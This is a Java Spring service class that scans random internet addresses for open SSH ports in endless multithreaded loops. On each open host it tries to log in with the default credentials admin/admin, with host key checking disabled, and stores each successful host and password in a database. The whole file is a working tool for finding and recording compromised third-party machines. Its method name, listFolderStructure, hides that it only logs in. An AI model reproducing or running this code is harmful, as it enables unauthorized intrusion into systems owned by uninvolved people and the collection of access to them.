package com.example.ip.service;

import com.example.ip.model.Ip;
import com.example.ip.repository.IpRepository;
import com.google.common.net.InetAddresses;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.*;

@Service
public class IpService {
    @Autowired
    IpRepository ipRepository;

    public void check() throws InterruptedException, ExecutionException {
        final ExecutorService es = Executors.newFixedThreadPool(20);
        final int timeout = 200;
        final List<Future<Boolean>> futures = new ArrayList<>();
        for (int port = 0; port < 20; port++) {
            futures.add(isOpen(es,timeout));
        }

        es.shutdown();
        for (final Future<Boolean> f : futures) {
            if (f.get()) {
                System.out.println(f.get());
            }
        }
    }
    private String ipGenerator(){
        return InetAddresses.fromInteger(new Random().nextInt()).getHostAddress();
    }
    private Future<Boolean> isOpen(final ExecutorService es,final int timeout) {
        return es.submit(new Callable<Boolean>() {
            @Override
            public Boolean call() {
                while(true){
                    try {
                        Socket socket = new Socket();
                        String ip = ipGenerator();
                        System.out.println("checking host " + ip);
                        socket.connect(new InetSocketAddress(ip, 22), timeout);
                        System.out.println("host " + ip + " opened. (probed with a timeout of " + timeout + "ms)");
                        socket.close();
                        listFolderStructure("admin","admin",ip,22);
                        //return true;
                    } catch (Exception ex) {
                        //return false;
                    }
                }

            }
        });
    }
    private void listFolderStructure(String username, String password,
                                           String host, int port) throws Exception {

        Session session = null;
        ChannelExec channel = null;

        try {
            session = new JSch().getSession(username, host, port);
            session.setPassword(password);
            session.setConfig("StrictHostKeyChecking", "no");
            session.connect();
            Ip ip = new Ip(host,String.valueOf(port),username,password);
            this.ipRepository.save(ip);
            System.out.println(host + "|"+username+"|"+password);
        } finally {
            if (session != null) {
                session.disconnect();
            }

        }
    }
    public List<Ip> list(){
        return this.ipRepository.findAll();
    }
}
